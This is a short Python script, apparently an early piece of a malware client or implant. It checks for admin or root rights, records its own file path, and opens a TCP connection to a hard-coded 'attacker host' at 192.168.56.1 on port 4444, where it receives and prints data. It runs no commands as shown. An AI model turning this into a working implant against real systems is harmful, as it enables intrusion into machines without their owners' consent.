import ctypes, os
import pathlib
import socket


def is_user_admin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()

    return is_admin


isAdmin = is_user_admin()


def get_file_path():
    directory = pathlib.Path(__file__).parent.resolve()
    fileName = os.path.basename(__file__)

    filePath = f"{directory}\\{fileName}"

    return filePath


path = get_file_path()


# attacker host and port to connect to
IPV4 = '192.168.56.1'
PORT = 4444


def connect_to_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IPV4, PORT))
        data = s.recv(1024)

    return repr(data)


dataReceived = connect_to_server()
print(dataReceived)